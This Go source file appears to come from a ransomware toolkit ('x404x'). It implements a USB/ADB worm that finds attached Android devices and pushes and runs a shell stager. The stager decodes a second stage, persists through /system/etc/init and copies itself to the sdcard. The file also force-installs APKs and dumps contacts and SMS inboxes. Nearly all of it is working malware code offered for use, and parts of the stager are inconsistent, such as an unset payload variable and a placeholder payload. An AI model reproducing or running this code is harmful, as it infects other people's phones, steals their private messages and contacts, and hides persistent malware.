package ransomware

import rw "github.com/ruby570bocadito/x404x/internal/ransomware"

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

type USBADBWorm struct {
	config     *rw.RansomwareConfig
	adbPath    string
	payload    []byte
	deviceSerials []string
}

func NewUSBADBWorm(cfg *rw.RansomwareConfig) *USBADBWorm {
	return &USBADBWorm{
		config: cfg,
	}
}

func (u *USBADBWorm) FindADB() (string, error) {
	paths := []string{"adb", "/usr/bin/adb", "/usr/local/bin/adb",
		filepath.Join(os.Getenv("ANDROID_HOME"), "platform-tools", "adb"),
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Android", "Sdk", "platform-tools", "adb.exe"),
		filepath.Join(os.Getenv("ProgramFiles(x86)"), "Android", "android-sdk", "platform-tools", "adb.exe"),
	}

	for _, p := range paths {
		if _, err := os.Stat(p); err == nil {
			u.adbPath = p
			return p, nil
		}
	}

	adbPath, err := exec.LookPath("adb")
	if err == nil {
		u.adbPath = adbPath
		return adbPath, nil
	}

	return "", fmt.Errorf("ADB not found")
}

func (u *USBADBWorm) ListDevices() ([]string, error) {
	if u.adbPath == "" {
		if _, err := u.FindADB(); err != nil {
			return nil, err
		}
	}

	cmd := exec.Command(u.adbPath, "devices")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}

	var devices []string
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "\tdevice") {
			parts := strings.Split(line, "\t")
			if len(parts) >= 1 {
				serial := parts[0]
				devices = append(devices, serial)
			}
		}
	}

	u.deviceSerials = devices
	return devices, nil
}

func (u *USBADBWorm) ConnectDevice(serial string) error {
	cmd := exec.Command(u.adbPath, "-s", serial, "wait-for-device")
	return cmd.Run()
}

func (u *USBADBWorm) PushPayload(serial string, localPath, remotePath string) error {
	u.ConnectDevice(serial)

	cmd := exec.Command(u.adbPath, "-s", serial, "push", localPath, remotePath)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("push failed: %s — %v", string(out), err)
	}

	time.Sleep(500 * time.Millisecond)
	return nil
}

func (u *USBADBWorm) ExecutePayload(serial string, remotePath string) error {
	cmd := exec.Command(u.adbPath, "-s", serial, "shell", "chmod", "755", remotePath)
	cmd.Run()

	cmd2 := exec.Command(u.adbPath, "-s", serial, "shell", remotePath)
	return cmd2.Start()
}

func (u *USBADBWorm) PullFiles(serial string, remotePath, localPath string) error {
	cmd := exec.Command(u.adbPath, "-s", serial, "pull", remotePath, localPath)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("pull failed: %s — %v", string(out), err)
	}
	return nil
}

func (u *USBADBWorm) InstallAPK(serial string, apkPath string) error {
	cmd := exec.Command(u.adbPath, "-s", serial, "install", "-r", "-d", apkPath)
	out, err := cmd.CombinedOutput()
	if err != nil {
		if strings.Contains(string(out), "INSTALL_FAILED_UPDATE_INCOMPATIBLE") {
			exec.Command(u.adbPath, "-s", serial, "uninstall",
				strings.ReplaceAll(filepath.Base(apkPath), ".apk", "")).Run()
			return u.InstallAPK(serial, apkPath)
		}
		return fmt.Errorf("install failed: %s — %v", string(out), err)
	}
	return nil
}

func (u *USBADBWorm) EnumerateApps(serial string) ([]string, error) {
	cmd := exec.Command(u.adbPath, "-s", serial, "shell", "pm", "list", "packages")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}

	var apps []string
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "package:") {
			apps = append(apps, strings.TrimPrefix(line, "package:"))
		}
	}
	return apps, nil
}

func (u *USBADBWorm) DeployRemoteWorm(serial string, wormPayload string) error {
	wormScript := fmt.Sprintf(`#!/system/bin/sh
# X404X Android Worm Stager
C2="%s"
TMP="/data/local/tmp"
mkdir -p $TMP

echo "$WORM" | base64 -d > $TMP/stage2
chmod 755 $TMP/stage2
$TMP/stage2 &

# persistence via init script
if [ -w /system/etc/init/ ]; then
    cp $TMP/stage2 /system/etc/init/x404xd
    chmod 755 /system/etc/init/x404xd
fi

# spread via sdcard
for mnt in /sdcard /storage/emulated/0 /mnt/sdcard; do
    if [ -d "$mnt" ]; then
        cp $TMP/stage2 "$mnt/.x404x_stager" 2>/dev/null
    fi
done
`, wormPayload)

	scriptPath := filepath.Join(os.TempDir(), "x404x_adb_worm.sh")
	os.WriteFile(scriptPath, []byte(wormScript), 0755)

	u.PushPayload(serial, scriptPath, "/data/local/tmp/x404x_adb_stage.sh")
	u.ExecutePayload(serial, "/data/local/tmp/x404x_adb_stage.sh")

	os.Remove(scriptPath)
	return nil
}

func (u *USBADBWorm) USBTimestompPropagate() (int, error) {
	devices, err := u.ListDevices()
	if err != nil {
		return 0, err
	}

	infected := 0
	for _, serial := range devices {
		u.ConnectDevice(serial)

		apps, _ := u.EnumerateApps(serial)
		_ = apps

		wormPayload := "base64encodedwormdata"
		if err := u.DeployRemoteWorm(serial, wormPayload); err == nil {
			infected++
		}
	}

	return infected, nil
}

func (u *USBADBWorm) DumpContacts(serial string) (string, error) {
	cmd := exec.Command(u.adbPath, "-s", serial, "shell",
		"content", "query", "--uri", "content://contacts/phones")
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func (u *USBADBWorm) DumpSMS(serial string) (string, error) {
	cmd := exec.Command(u.adbPath, "-s", serial, "shell",
		"content", "query", "--uri", "content://sms/inbox")
	out, err := cmd.CombinedOutput()
	return string(out), err
}

func (u *USBADBWorm) FullUSBADBSuite(apkPath string) map[string]interface{} {
	result := make(map[string]interface{})

	adbFound, err := u.FindADB()
	if err != nil {
		result["adb_found"] = false
		result["error"] = err.Error()
		return result
	}
	result["adb_path"] = adbFound

	devices, err := u.ListDevices()
	if err != nil {
		result["devices_error"] = err.Error()
	} else {
		result["devices_count"] = len(devices)
		result["devices"] = devices
	}

	if len(devices) > 0 && apkPath != "" {
		if _, err := os.Stat(apkPath); err == nil {
			infected := 0
			for _, s := range devices {
				if err := u.InstallAPK(s, apkPath); err == nil {
					infected++
				}
			}
			result["infected"] = infected
		}
	}

	result["platform"] = runtime.GOOS
	return result
}

var _ = os.Stat
